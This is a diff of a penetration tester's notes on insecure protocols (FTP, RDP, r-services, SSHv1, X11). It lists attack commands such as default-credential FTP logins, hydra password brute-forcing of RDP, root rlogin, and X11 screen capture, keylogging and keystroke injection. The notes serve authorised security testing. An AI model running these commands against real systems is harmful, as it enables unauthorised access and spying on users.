@@ -1,79 +1,145 @@
 Insecure Protocols
 
 
-# FTP access with admin/null credentials
+# Overview
 
-ftp admin@<target IP>
-user
-admin
-pwd
+Test legacy and cleartext services for weak authentication, missing encryption, and remote access without credentials. Many findings are informational unless paired with successful login or data access.
 
-telnet <target IP> 21
-user admin
-pass
-id;
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# FTP on non-standard port
+# Related Notes
 
-ftp <target IP> <port>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+passwords.txt            Online brute force with hydra
+linux.txt                X11 access detail and xspy compile notes
+nmap-fire.txt            Service discovery scripts
 
-# FTP server does not support AUTH command
 
-telnet <target IP> 21
-AUTH test
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Contents
+
+FTP, Remote Desktop, Rservices, SSHv1, X11
+
+
+# FTP
+
+## Overview
+
+FTP sends credentials in cleartext. Test default accounts, non-standard ports, and missing TLS (AUTH).
+
+## Commands
+
+Interactive with defaults:
+    ftp admin@<target IP>
+    # user: admin, password: (empty) or admin
+
+Telnet to port 21:
+    telnet <target IP> 21
+    user admin
+    pass
+    id;
+
+Non-standard port:
+    ftp <target IP> <port>
+
+Check for TLS support:
+    telnet <target IP> 21
+    AUTH TLS
+    # 234 = TLS supported; 502/530 = not supported or rejected
+
+## Validation / False Positives
+
+Anonymous FTP with only public content is low severity — demonstrate upload or sensitive file read for impact.
+AUTH rejection alone is informational if cleartext login still works.
+
 
 # Remote Desktop
 
-hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://targetIP
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Overview
+
+RDP on 3389 may allow password spraying or weak local administrator passwords.
+
+## Commands
+
+    hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target IP>
+
+## Validation / False Positives
+
+Account lockout policies apply — throttle attempts and confirm scope before large sprays.
+
 
 # Rservices
 
-513/tcp
-apt install rsh-client
-rlogin -l root <target IP>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Overview
 
-# SSH Protocol v1
+rlogin, rsh, and rexec (512–514/tcp) trust host-based authentication and often permit root without a password.
 
-nmap -Pn -n -T4 -p22 --script=sshv1 <target IP>
+## Commands
 
-ssh -1 <target IP>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    apt install rsh-client
+    rlogin -l root <target IP>
+    rsh root@<target IP>
+    rexec -l root <target IP> id
+
+nmap:
+    nmap -p512-514 --script=rpc-grind <target IP>
+
+## Validation / False Positives
+
+Open TCP ports without a working rsh/rlogin daemon are not findings — capture successful shell or command execution.
+
+
+# SSHv1
+
+## Overview
+
+SSH protocol version 1 has known cryptographic weaknesses. Modern servers should negotiate v2 only.
+
+## Commands
+
+    nmap -Pn -n -T4 -p22 --script=sshv1 <target IP>
+
+Force v1 (if server allows):
+    ssh -1 <target IP>
+
+## Validation / False Positives
+
+Banner reporting "1.99" often means the server supports both v1 and v2 — confirm whether a v1 handshake actually completes.
+
 
 # X11
 
-nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>
+## Overview
 
-xspy <target IP>
+Unauthenticated X11 forwarding exposes the desktop — screenshot, keylogging, and remote input injection. See linux.txt for xspy compile notes and situational-awareness context.
 
-OS X
-- Screenshot
-xwd -display <targetIP>:<display> -root -out file.xwd
+## Commands
 
-- View screenshot
-xwud -in file.xwd
+Discover open displays:
+    nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>
 
-- Key logging
-xkey <targetIP>:0.0
+xspy:
+    xspy <target IP>
 
-xdotool/ydotool inject
-Open another Terminal and type:
+Screenshot:
+    xwd -display <target IP>:0 -root -out file.xwd
+    xwud -in file.xwd
 
-export DISPLAY=<ipaddress>:0
+Keylogging:
+    xkey <target IP>:0.0
 
-$ xdotool key x t e r m
-$ xdotool key KP_Enter
+Inject keystrokes (attacker terminal):
+    export DISPLAY=<target IP>:0
+    xdotool key x t e r m
+    xdotool key KP_Enter
 
-Might need to inject 1 char at a time:
+One character at a time if needed:
+    xdotool key x
+    xdotool key t
+    xdotool key e
+    xdotool key r
+    xdotool key m
 
-xdotool key x
-xdotool key t
-xdotool key e
-xdotool key r
-xdotool key m
+On newer Ubuntu hosts, ydotool may be required instead of xdotool.
 
-Note: On some systems (like newer Ubuntu versions), you may need to use `ydotool` instead of `xdotool` for the commands above.
+## Validation / False Positives
+
+An open TCP port on 6000+n is not X11 access — demonstrate capture or input control on the active display.
+xhost + entries may be intentional in lab environments — document actual data exposed.
